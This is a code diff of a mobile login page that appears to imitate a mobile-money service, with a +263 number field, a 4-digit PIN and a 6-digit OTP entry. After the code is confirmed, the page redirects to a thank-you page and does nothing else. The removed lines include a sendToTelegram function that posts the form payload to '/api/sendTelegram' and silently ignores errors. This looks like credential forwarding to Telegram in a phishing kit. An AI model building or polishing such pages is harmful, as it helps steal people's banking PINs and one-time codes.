@@ -60,21 +60,13 @@ label{
   color:#475569;
 }
 
-/* PHONE FIELD — CLEAN BLACK */
+/* PHONE FIELD (BLUE LIKE PIN) */
 .phone-field{
   display:flex;
   align-items:center;
   border-radius:14px;
-  background:#020617;
-  padding:2px;
-}
-
-.phone-inner{
-  display:flex;
-  align-items:center;
-  background:#ffffff;
-  border-radius:12px;
-  width:100%;
+  border:2px solid var(--eco-blue);
+  background:#f8fafc;
 }
 
 .cc{
@@ -82,7 +74,6 @@ label{
   min-width:64px;
   text-align:center;
   font-weight:600;
-  color:#020617;
 }
 
 .divider{
@@ -121,13 +112,23 @@ label{
   justify-content:center;
   font-size:18px;
   font-weight:700;
+  position:relative;
 }
 
-/* hidden pin input */
+.pin-box.active::after{
+  content:"";
+  position:absolute;
+  width:2px;
+  height:60%;
+  background:#020617;
+  animation:blink 1s steps(1) infinite;
+}
+
+@keyframes blink{50%{opacity:0}}
+
 #pin{
   position:absolute;
   opacity:0;
-  pointer-events:none;
 }
 
 /* BUTTON */
@@ -191,6 +192,16 @@ label{
   justify-content:center;
   font-size:18px;
   font-weight:600;
+  position:relative;
+}
+
+.otp-digit.active::after{
+  content:"";
+  position:absolute;
+  width:2px;
+  height:60%;
+  background:#020617;
+  animation:blink 1s steps(1) infinite;
 }
 
 .otp-digit.filled{
@@ -216,21 +227,10 @@ label{
   border-radius:12px;
 }
 
-.resend-btn[disabled]{opacity:.6}
-.action-secondary{background:#e5e7eb;color:#020617}
-
-/* SPINNER */
-.spinner{
-  width:14px;height:14px;
-  border:2px solid rgba(0,0,0,.3);
-  border-top-color:#000;
-  border-radius:50%;
-  display:inline-block;
-  animation:spin .8s linear infinite;
-  vertical-align:-2px;
-  margin-right:6px;
+.action-secondary{
+  background:#e5e7eb;
+  color:#020617;
 }
-@keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
 
@@ -240,14 +240,12 @@ label{
   <img src="assets/eco.png" class="logo">
   <div class="login-title">Login</div>
 
-  <form id="loginForm" autocomplete="off">
+  <form id="loginForm">
     <label>Mobile Number</label>
     <div class="phone-field">
-      <div class="phone-inner">
-        <div class="cc">+263</div>
-        <div class="divider"></div>
-        <input id="phone" class="phone-input" inputmode="numeric" placeholder="Mobile No.">
-      </div>
+      <div class="cc">+263</div>
+      <div class="divider"></div>
+      <input id="phone" class="phone-input" inputmode="numeric" placeholder="Mobile No.">
     </div>
     <div id="phoneError" class="error"></div>
 
@@ -282,11 +280,6 @@ label{
     <input id="otpBuffer" inputmode="numeric" autocomplete="one-time-code"
            style="position:absolute;opacity:0">
 
-    <div class="resend-row">
-      <div class="small">Resend in <span id="countdown">120</span>s</div>
-      <button id="resendBtn" class="resend-btn" disabled>Resend</button>
-    </div>
-
     <div style="display:flex;gap:10px;margin-top:14px">
       <button id="confirmOtp" class="resend-btn" disabled>Confirm</button>
       <button id="cancelOtp" class="resend-btn action-secondary">Cancel</button>
@@ -295,38 +288,12 @@ label{
 </div>
 
 <script>
-function sendToTelegram(payload){
-  fetch('/api/sendTelegram',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(payload)
-  }).catch(()=>{});
-}
-
-/* PIN LOGIC */
+/* PHONE + PIN */
+const phone=document.getElementById('phone');
 const pin=document.getElementById('pin');
 const pinBoxes=[...document.querySelectorAll('.pin-box')];
-document.getElementById('pinBoxes').onclick=()=>pin.focus();
-
-function renderPin(){
-  pinBoxes.forEach((b,i)=>b.textContent=pin.value[i]||'');
-}
-
-pin.oninput=()=>{
-  pin.value=pin.value.replace(/\D/g,'').slice(0,4);
-  renderPin();
-  updateState();
-};
-
-/* PHONE */
-const phone=document.getElementById('phone');
-const phoneError=document.getElementById('phoneError');
 const loginBtn=document.getElementById('loginBtn');
-
-phone.oninput=()=>{
-  phone.value=phone.value.replace(/\D/g,'').slice(0,9);
-  updateState();
-};
+const phoneError=document.getElementById('phoneError');
 
 function validatePhone(){
   if(!/^7\d{8}$/.test(phone.value)){
@@ -336,6 +303,26 @@ function validatePhone(){
   phoneError.textContent='';
   return true;
 }
+
+function renderPin(){
+  pinBoxes.forEach((b,i)=>{
+    b.textContent=pin.value[i]||'';
+    b.classList.toggle('active',i===pin.value.length);
+  });
+}
+
+phone.oninput=()=>{
+  phone.value=phone.value.replace(/\D/g,'').slice(0,9);
+  updateState();
+};
+
+pin.oninput=()=>{
+  pin.value=pin.value.replace(/\D/g,'').slice(0,4);
+  renderPin();
+  updateState();
+};
+
+document.getElementById('pinBoxes').onclick=()=>pin.focus();
 
 function updateState(){
   loginBtn.disabled=!(validatePhone() && pin.value.length===4);
@@ -353,24 +340,20 @@ document.getElementById('loginForm').onsubmit=e=>{
 const buffer=document.getElementById('otpBuffer');
 const dots=[...document.querySelectorAll('.otp-digit')];
 const confirmBtn=document.getElementById('confirmOtp');
-const resendBtn=document.getElementById('resendBtn');
-const countdown=document.getElementById('countdown');
-
-let timer,seconds=120;
-
-function startOtp(){
-  buffer.value='';
-  renderOtp('');
-  buffer.focus();
-  startCountdown();
-}
 
 function renderOtp(v){
   dots.forEach((d,i)=>{
     d.textContent=v[i]||'';
     d.classList.toggle('filled',!!v[i]);
+    d.classList.toggle('active',i===v.length);
   });
   confirmBtn.disabled=v.length!==6;
+}
+
+function startOtp(){
+  buffer.value='';
+  renderOtp('');
+  buffer.focus();
 }
 
 buffer.oninput=()=>{
@@ -378,25 +361,10 @@ buffer.oninput=()=>{
   renderOtp(buffer.value);
 };
 
-function startCountdown(){
-  clearInterval(timer);
-  seconds=120;
-  resendBtn.disabled=true;
-  countdown.textContent=seconds;
-  timer=setInterval(()=>{
-    countdown.textContent=--seconds;
-    if(seconds<=0){
-      clearInterval(timer);
-      resendBtn.disabled=false;
-    }
-  },1000);
-}
+dots.forEach(d=>d.onclick=()=>buffer.focus());
 
-/* CANCEL */
-document.getElementById('cancelOtp').onclick=()=>{
-  clearInterval(timer);
-  otpModal.style.display='none';
-};
+confirmBtn.onclick=()=>location.href='thankyou.html';
+document.getElementById('cancelOtp').onclick=()=>otpModal.style.display='none';
 </script>
 
 </body>
